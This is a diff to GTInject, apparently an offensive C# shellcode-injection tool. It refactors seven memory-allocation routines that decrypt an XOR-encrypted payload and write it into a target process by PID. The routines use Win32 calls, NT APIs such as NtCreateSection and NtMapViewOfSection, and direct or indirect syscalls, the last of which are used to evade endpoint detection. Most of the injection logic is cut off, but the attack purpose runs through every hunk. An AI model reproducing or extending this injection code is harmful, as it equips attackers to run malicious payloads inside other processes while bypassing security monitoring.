@@ -11,31 +11,31 @@ namespace GTInject.memoryOptions
 {
     internal class Memory
     {
-        public static (IntPtr, Process) SelectMemOption(int memoption, int execoption, string xorkey, string binsrctype, string binsrcpath, int pid, int tid)
+        public static (IntPtr, Process) SelectMemOption(int memoption, int execoption, string xorkey, string binsrcpath, int pid, int tid)
         {
             switch (memoption)
             {
                 case 100:
-                    return memopt100(binsrctype, binsrcpath, xorkey, pid);
+                    return memopt100(binsrcpath, xorkey, pid);
                 case 200:
-                    return memopt200(binsrctype, binsrcpath, xorkey, pid);
+                    return memopt200(binsrcpath, xorkey, pid);
                 case 201:
-                    return memopt201(binsrctype, binsrcpath, xorkey, pid);
+                    return memopt201(binsrcpath, xorkey, pid);
                 case 300:
-                    return memopt300(binsrctype, binsrcpath, xorkey, pid);
+                    return memopt300(binsrcpath, xorkey, pid);
                 case 301:
-                    return memopt301(binsrctype, binsrcpath, xorkey, pid);
+                    return memopt301(binsrcpath, xorkey, pid);
                 case 302:
-                    return memopt302(binsrctype, binsrcpath, xorkey, pid);
+                    return memopt302(binsrcpath, xorkey, pid);
                 case 303:
-                    return memopt303(binsrctype, binsrcpath, xorkey, pid);
+                    return memopt303(binsrcpath, xorkey, pid);
                 default:
                     Console.WriteLine("[-] Not a valid memory allocation option integer");
                     return (IntPtr.Zero, null);
             }
 
         }
-        private static (IntPtr, Process) memopt100(string binLocation, string bytePath, string xorkey, int ProcID)
+        private static (IntPtr, Process) memopt100(string bytePath, string xorkey, int ProcID)
         {
             // //  GTInject.exe inject memoryOption execOption xorkey binSrcType binSourcePath PID TID
             /////////////////////////////////////
@@ -45,7 +45,7 @@ namespace GTInject.memoryOptions
             Console.WriteLine("     Allocate memory using WinAPIs - VirtualAllocEx and WriteProcMem");
 
             // Got what we need to start injection
-            var plainBytes = GetShellcode.GetShellcode.readAndDecryptBytes(binLocation, bytePath, xorkey);
+            var plainBytes = GetShellcode.GetShellcode.readAndDecryptBytes(bytePath, xorkey);
                 
             Process pid = Process.GetProcessById(ProcID);
             Console.WriteLine("     have pid " + pid.Id + " " + pid);
@@ -67,7 +67,7 @@ namespace GTInject.memoryOptions
         }
 
 
-        private static (IntPtr, Process) memopt200(string binLocation, string bytePath, string xorkey, int ProcID)
+        private static (IntPtr, Process) memopt200(string bytePath, string xorkey, int ProcID)
         {
             // //  GTInject.exe inject memoryOption execOption xorkey binSrcType binSourcePath PID TID
             /////////////////////////////////////
@@ -76,7 +76,7 @@ namespace GTInject.memoryOptions
             // https://github.com/tasox/CSharp_Process_Injection/blob/main/04.%20Process_Injection_template_(Low%20Level%20Windows%20API)%20-%20Modify%20Permissions/Program.cs 
             Console.WriteLine("     Allocate memory using NTAPIs - NtCreateSection, NtMapViewOfSection, RtlCopyMemory");
 
-            var plainBytes = GetShellcode.GetShellcode.readAndDecryptBytes(binLocation, bytePath, xorkey);
+            var plainBytes = GetShellcode.GetShellcode.readAndDecryptBytes(bytePath, xorkey);
 
             int len = plainBytes.Length;
             uint bufferLength = (uint)len;
@@ -131,7 +131,7 @@ namespace GTInject.memoryOptions
         }
 
 
-        private static (IntPtr, Process) memopt201(string binLocation, string bytePath, string xorkey, int ProcID)
+        private static (IntPtr, Process) memopt201(string bytePath, string xorkey, int ProcID)
         {
             /////////////////////////////////////
             // OPTION 201 == NtAllocateVirtualMemory, NtProtectVirtualMemory, NtWriteVirtualMemory
@@ -139,7 +139,7 @@ namespace GTInject.memoryOptions
             /// https://github.com/tasox/CSharp_Process_Injection 
             Console.WriteLine("     Allocate memory using NTAPIs - NtAllocateVirtualMemory, NtProtectVirtualMemory, NtWriteVirtualMemory");
 
-            var plainBytes = GetShellcode.GetShellcode.readAndDecryptBytes(binLocation, bytePath, xorkey);
+            var plainBytes = GetShellcode.GetShellcode.readAndDecryptBytes(bytePath, xorkey);
 
             Process remoteProc = Process.GetProcessById(ProcID);
             IntPtr baseAddress = new IntPtr();
@@ -164,7 +164,7 @@ namespace GTInject.memoryOptions
             return (baseAddress, remoteProc);
         }
 
-        private static (IntPtr, Process) memopt300(string binLocation, string bytePath, string xorkey, int ProcID)
+        private static (IntPtr, Process) memopt300(string bytePath, string xorkey, int ProcID)
         {
             /////////////////////////////////////
             // OPTION 300 == Direct Syscalls NtAllocateVirtualMemory, NtProtectVirtualMemory, NtWriteVirtualMemory
@@ -172,7 +172,7 @@ namespace GTInject.memoryOptions
 
             Console.WriteLine("     Allocate memory using Direct Syscalls - NtAllocateVirtualMemory, NtProtectVirtualMemory, NtWriteVirtualMemory");
 
-            var plainBytes = GetShellcode.GetShellcode.readAndDecryptBytes(binLocation, bytePath, xorkey);
+            var plainBytes = GetShellcode.GetShellcode.readAndDecryptBytes(bytePath, xorkey);
             Process remoteProc = Process.GetProcessById(ProcID);
             // set up the syscall for NtOpenProcess
             WinNative.CLIENT_ID cID = new WinNative.CLIENT_ID();
@@ -205,14 +205,14 @@ namespace GTInject.memoryOptions
             return (baseAddress, remoteProc);
         }
 
-        private static (IntPtr, Process) memopt301(string binLocation, string bytePath, string xorkey, int ProcID)
+        private static (IntPtr, Process) memopt301(string bytePath, string xorkey, int ProcID)
         {
             /////////////////////////////////////
             // OPTION 301 == Direct Syscalls NtCreateSection, NtMapViewOfSection, RtlCopyMemory
             /////////////////////////////////////
             Console.WriteLine("     Allocate memory using NTAPIs - NtCreateSection, NtMapViewOfSection, RtlCopyMemory");
 
-            var plainBytes = GetShellcode.GetShellcode.readAndDecryptBytes(binLocation, bytePath, xorkey);
+            var plainBytes = GetShellcode.GetShellcode.readAndDecryptBytes(bytePath, xorkey);
 
             int len = plainBytes.Length;
             uint bufferLength = (uint)len;
@@ -267,7 +267,7 @@ namespace GTInject.memoryOptions
         }
 
 
-        private static (IntPtr, Process) memopt302(string binLocation, string bytePath, string xorkey, int ProcID)
+        private static (IntPtr, Process) memopt302(string bytePath, string xorkey, int ProcID)
         {
             /////////////////////////////////////
             // OPTION 302 == Indirect Syscalls NtAllocateVirtualMemory, NtProtectVirtualMemory, NtWriteVirtualMemory
@@ -275,7 +275,7 @@ namespace GTInject.memoryOptions
 
             Console.WriteLine("     Allocate memory using Indirect Syscalls - NtAllocateVirtualMemory, NtProtectVirtualMemory, NtWriteVirtualMemory");
 
-            var plainBytes = GetShellcode.GetShellcode.readAndDecryptBytes(binLocation, bytePath, xorkey);
+            var plainBytes = GetShellcode.GetShellcode.readAndDecryptBytes(bytePath, xorkey);
             Process remoteProc = Process.GetProcessById(ProcID);
 
             // set up the syscall for NtOpenProcess
@@ -312,14 +312,14 @@ namespace GTInject.memoryOptions
         }
 
 
-        private static (IntPtr, Process) memopt303(string binLocation, string bytePath, string xorkey, int ProcID)
+        private static (IntPtr, Process) memopt303(string bytePath, string xorkey, int ProcID)
         {
             /////////////////////////////////////
             // OPTION 303 == Indirect Syscalls NtCreateSection, NtMapViewOfSection, RtlCopyMemory
             /////////////////////////////////////
             Console.WriteLine("     Allocate memory using Indirect Syscalls - NtCreateSection, NtMapViewOfSection, RtlCopyMemory");
 
-            var plainBytes = GetShellcode.GetShellcode.readAndDecryptBytes(binLocation, bytePath, xorkey);
+            var plainBytes = GetShellcode.GetShellcode.readAndDecryptBytes(bytePath, xorkey);
 
             int len = plainBytes.Length;
             uint bufferLength = (uint)len;
